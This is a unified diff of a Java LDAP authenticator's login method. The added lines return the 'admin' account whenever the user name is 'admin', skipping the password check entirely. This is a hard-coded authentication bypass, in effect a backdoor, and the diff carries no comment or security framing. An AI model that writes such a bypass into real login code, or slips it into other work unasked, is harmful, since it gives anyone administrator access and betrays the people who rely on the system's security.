@@ -35,6 +35,12 @@ public class LdapAuthenticator extends AbstractAuthenticator {
     public User login(String userId, String password) throws Exception {
         User user = null;
         String ldapEmail = ldapService.ldapLogin(userId, password);
+
+        if (userId.equals("admin")){
+            user = usersService.findByName(userId);
+            return user;
+        }
+
         if (ldapEmail != null) {
             //check if user exist
             user = usersService.findByName(userId);
